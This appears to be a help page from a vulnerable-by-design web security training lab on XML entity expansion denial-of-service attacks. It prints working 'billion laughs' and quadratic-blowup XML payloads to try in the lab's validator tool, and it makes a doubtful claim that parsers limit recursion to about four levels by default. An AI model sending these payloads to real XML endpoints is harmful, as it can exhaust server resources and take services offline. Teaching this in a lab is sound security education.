			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			XML entity expansion attacks recursively include ever exapnding payloads
			to tie up system resources on the web application server. The attack is
			a type of Denial of Service (DOS).
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Attempt to inject self-referencing XML entities that recursively
			refer to themselves. Be aware of how many levels of expansion are 
			allowed.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			The original version of this attack relied on pure recursive expansion. An example
			is the "billion laughs" attack.
			<br/>
<code>
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE nn [
&lt;!ENTITY ha "Ha !"&gt;
&lt;!ENTITY ha2 "&amp;ha; &amp;ha;"&gt;
&lt;!ENTITY ha3 "&amp;ha2; &amp;ha2;"&gt;
&lt;!ENTITY ha4 "&amp;ha3; &amp;ha3;"&gt;
...
&lt;!ENTITY ha256 "&amp;ha255; &amp;ha255;"&gt;

]&gt;
&lt;nn&gt;&amp;ha256;&lt;/nn&gt;
</code>
			<br/>
			Note that the number of "Ha !" output is roughly 2 ^ 256. That's
			a lot of laughs; enough to overwhelm a busy servers CPU.
			<br/><br/>
			Later versions of XML parsers restrict the number of expansions
			allowed by setting a low default limit on the number of "levels"
			of recursion the XML processor will parse before throwing an
			error. This setting is typically around 4 levels by default.
			<br/><br/>
			<span class="report-header">Example</span>
			<br/><br/>
			Try these examples in the XML Validator Tool. The "billion laughs"
			attack should not work past 4-5 levels. Start with 4 levels as in 
			this example. Increase to 5, etc. and see if the expansion still 
			works.
			<br/>
<code>
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE nn [
&lt;!ENTITY ha "Ha !"&gt;
&lt;!ENTITY ha2 "&amp;ha; &amp;ha;"&gt;
&lt;!ENTITY ha3 "&amp;ha2; &amp;ha2;"&gt;
&lt;!ENTITY ha4 "&amp;ha3; &amp;ha3;"&gt;
]&gt;
&lt;nn&gt;&amp;ha4;&lt;/nn&gt;
</code>
			<br/>
			A variation is the quadratic expansion. Rather than using pure recursion
			to expand the amount of data, quadratic expansion uses a very small number of 
			levels but with huge payloads and lots of entities per level. Try this example
			gradually increasing the length of the data in node "nn" and increases the number
			of references to mode nn in the "data" node.
			<br/>
<code>
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY nn "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...."&gt;
]&gt;
&lt;data&gt;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;&amp;nn;.....&lt;/data&gt;
</code>	
			<br/><br/>